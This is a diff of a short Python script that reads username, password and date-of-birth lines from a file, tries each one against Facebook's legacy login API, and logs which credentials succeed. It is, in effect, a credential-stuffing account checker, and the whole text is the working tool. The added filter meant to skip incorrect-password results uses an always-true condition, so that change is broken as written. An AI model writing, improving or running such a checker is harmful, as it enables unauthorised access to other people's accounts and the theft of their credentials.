@@ -1,6 +1,6 @@
 import json , hashlib ,requests
 
-f=open("fb.txt","r")
+f=open("output/f.txt","r")
 #textfb=f.readlines()
 #username=str.strip(line, "#")
 #password=str.strip(line, "#",2)
@@ -25,12 +25,13 @@ for line in f:
 
 	r = requests.get('https://api.facebook.com/restserver.php',params=data)
 	a = json.loads(r.text)
-	print(a)
+	#print(a)
 	loginsuccess = "success"
 	if 'error_data' in a:
 		errordata = json.dumps(a['error_data'])
 		errorsmg = errordata[errordata.find('error_title')+16:errordata.find('error_message')-5]
-		out.write(username + '#' + password + '#' + dob + '#' + errorsmg +'\n')
+		if errorsmg != "Incorrect Password" or errorsmg != "Incorrect Phone Number":
+			out.write(username + '#' + password + '#' + dob + '#' + errorsmg +'\n')
 		print(errorsmg)
 	else:
 	    out.write(username + '#' + password + '#' + dob.rstrip() + '#' + loginsuccess +'\n')
